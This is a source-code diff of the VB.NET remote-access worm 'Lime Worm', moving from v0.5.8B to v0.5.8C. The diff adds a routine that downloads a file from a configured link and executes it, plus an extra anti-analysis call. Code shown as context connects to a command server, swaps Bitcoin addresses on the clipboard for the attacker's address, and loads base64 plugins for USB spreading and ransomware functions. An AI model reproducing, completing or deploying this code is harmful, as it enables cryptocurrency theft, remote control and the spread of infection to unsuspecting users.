@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on May./08/2018        ##
+'##        N Y A N   C A T  |||   Updated on May./09/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                     .. Lime Worm v0.5.8B ..                   ##
+'##                    .. Lime Worm v0.5.8C ..                   ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -62,6 +62,10 @@ Public Class C_Main
             Call Anti()
         End If
 
+        If C_Settings.ANTI Then
+            Call Anti()
+        End If
+
         Call C_Installation.INS()
 
         C_Socket.T1.Start() 'Start TCP connection to server
@@ -85,6 +89,29 @@ Public Class C_Main
         Dim CHK As Thread = New Thread(AddressOf Checking)
         CHK.Start()
 
+        Try
+            If C_Settings.DWN_LINK <> "" Then
+
+                If C_Settings.DWN_CHK = True Then
+                    If GTV("DWN") <> "True" Then
+                        Dim WC As New Net.WebClient
+                        Dim file As String = IO.Path.GetTempFileName + IO.Path.GetFileName(C_Settings.DWN_LINK)
+                        WC.DownloadFile(C_Settings.DWN_LINK, file)
+                        Process.Start(file)
+                        STV("DWN", "True")
+                    End If
+
+                Else
+                    Dim WC As New Net.WebClient
+                    Dim file As String = IO.Path.GetTempFileName + IO.Path.GetFileName(C_Settings.DWN_LINK)
+                    WC.DownloadFile(C_Settings.DWN_LINK, file)
+                    Process.Start(file)
+                End If
+            End If
+        Catch ex As Exception
+            C.Send("MSG" + SPL + "Error! " + ex.Message)
+        End Try
+
     End Sub
 
 #Region "Loops"
@@ -94,9 +121,10 @@ Public Class C_Main
         Dim Old As String = GTV("Rans-Status")
         Dim Old2 As String = GTV("USB")
 
+
+        While True
+            Try
 1:
-        Try
-            While True
                 If C.CNT = True Then
                     Thread.CurrentThread.Sleep(3000)
                     'Compare old string with new string            
@@ -114,10 +142,10 @@ Public Class C_Main
                 Else
                     Thread.CurrentThread.Sleep(5000)
                 End If
-            End While
-        Catch ex As Exception
-            GoTo 1
-        End Try
+            Catch ex As Exception
+                GoTo 1
+            End Try
+        End While
 
     End Sub
 
@@ -132,7 +160,7 @@ Public Class C_Main
                 'more info https://en.bitcoin.it/wiki/Address
 
                 If My.Computer.Clipboard.GetText.Length >= 26 AndAlso My.Computer.Clipboard.GetText.Length <= 35 Then
-                    If My.Computer.Clipboard.GetText.StartsWith("1") Or My.Computer.Clipboard.GetText.StartsWith("3") Or My.Computer.Clipboard.GetText.StartsWith("bc1") Then
+                    If My.Computer.Clipboard.GetText.StartsWith("1") OrElse My.Computer.Clipboard.GetText.StartsWith("3") OrElse My.Computer.Clipboard.GetText.StartsWith("bc1") Then
                         My.Computer.Clipboard.SetText(C_Settings.BTC_ADDR)
                     End If
                 End If
@@ -142,33 +170,39 @@ Public Class C_Main
     End Sub
 
     Private Shared Sub StartSP()
-        If GTV("_USB") = Nothing Then
-            While True
-                If C.CNT = True Then
-                    Thread.CurrentThread.Sleep(9000)
-                    C.Send("PLUSB")
-                    Exit While
-                End If
-            End While
+        Try
+            If GTV("_USB") = Nothing Then
+                While True
+                    If C.CNT = True Then
+                        Thread.CurrentThread.Sleep(9000)
+                        C.Send("PLUSB")
+                        Exit While
+                    End If
+                End While
 
-        Else
-            C_Commands.Plugin(Convert.FromBase64String(GTV("_USB")))
-        End If
+            Else
+                C_Commands.Plugin(Convert.FromBase64String(GTV("_USB")))
+            End If
+        Catch ex As Exception
+        End Try
     End Sub
 
     Private Shared Sub StartPIN()
-        If GTV("_PIN") = Nothing Then
-            While True
-                If C.CNT = True Then
-                    Thread.CurrentThread.Sleep(11000)
-                    C.Send("PLPIN")
-                    Exit While
-                End If
-            End While
+        Try
+            If GTV("_PIN") = Nothing Then
+                While True
+                    If C.CNT = True Then
+                        Thread.CurrentThread.Sleep(11000)
+                        C.Send("PLPIN")
+                        Exit While
+                    End If
+                End While
 
-        Else
-            C_Commands.Plugin(Convert.FromBase64String(GTV("_PIN")))
-        End If
+            Else
+                C_Commands.Plugin(Convert.FromBase64String(GTV("_PIN")))
+            End If
+        Catch ex As Exception
+        End Try
     End Sub
 
 #End Region
